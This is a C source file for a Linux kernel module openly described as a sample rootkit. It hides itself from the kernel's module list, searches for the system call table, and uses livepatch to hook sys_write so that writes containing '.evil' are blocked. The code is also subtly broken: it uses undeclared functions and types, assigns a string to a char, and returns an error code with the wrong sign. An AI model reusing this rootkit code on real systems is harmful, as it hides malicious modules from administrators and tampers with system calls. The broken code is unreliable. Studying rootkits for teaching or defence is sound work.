/*
 * sys_call_hijack.c - sample for a simple LKM rootkit
 *
 * Copyright (C) 2015 Max Schrimpf. Based on a tutorial by Tyler Borland.
 *
 *This project is free software: You can redistribute it and/or 
 * modify it under the terms of the European Union Public Licence (EUPL v.1.1) 
 * or – as soon they will be approved by the European 
 * Commission - subsequent versions of the EUPL (the "Licence"); 
 * You may not use this work except in compliance with the Licence.
 * 
 * The project is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the 
 * Licence for the specific language governing permissions and 
 * limitations under the Licence.
 *
 * You should have received a copy of the GNU General Public License
 * along with this project; if not, see <http://ec.europa.eu/idabc/eupl.html>.
 */
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/livepatch.h>

static struct klp_func funcs[] = {
	{
		.old_name = "sys_write",
		.new_func = hijack_write,
	}, { }
};

static struct klp_object objs[] = {
	{
		/* name being NULL means vmlinux */
		.funcs = funcs,
	}, { }
};

static struct klp_patch patch = {
	.mod = THIS_MODULE,
	.objs = objs,
};

/*
 * Hijacked sys_call
 */
asmlinkage ssize_t hijack_write(int fd, const char __user *buff, size_t count) {
  printk("livepatch: hijack_write executed\n");
  int to_return; 
  char proc_protect = ".evil"; 
  char *kbuff = (char *) kmalloc(256,GFP_KERNEL); 
  copy_from_user(kbuff,buff,255); 
  if (strstr(kbuff,proc_protect)) { 
    kfree(kbuff); 
    return EEXIST; 
  }
  to_return = (*original_write)(fd,buff,count);
  kfree(kbuff);
  return to_return;
}

int hijack_init(void) {
	int ret;
  printk("livepatch: LKM loaded\n");

  list_del_init(&__this_module.list);
  kobject_del(&THIS_MODULE->mkobj.kobj);
  printk("livepatch: LKM hidden\n");

  if (sys_call_table = (psize *) find_sys_tab()) {
    printk("livepatch: sys_call_table found at %p\n",sys_call_table);
  } else {
    printk("livepatch: sys_call_table not found\n");
  }

	ret = klp_register_patch(&patch);
	if (ret)
		return ret;
	ret = klp_enable_patch(&patch);
	if (ret) {
		WARN_ON(klp_unregister_patch(&patch));
		return ret;
	}
  printk("livepatch: exchanged original sys_call with hijacked");

  return 0;
}

void hijack_exit(void) {
	WARN_ON(klp_disable_patch(&patch));
	WARN_ON(klp_unregister_patch(&patch));
  printk("livepatch: exchanged hijacked sys_call with original");

  printk("livepatch: LKM removed\n");
}

MODULE_LICENSE("EUPL");
MODULE_AUTHOR("Max Schrimpf");
MODULE_DESCRIPTION("Syscall hijacking by a rootkit example");
module_init(hijack_init);
module_exit(hijack_exit);
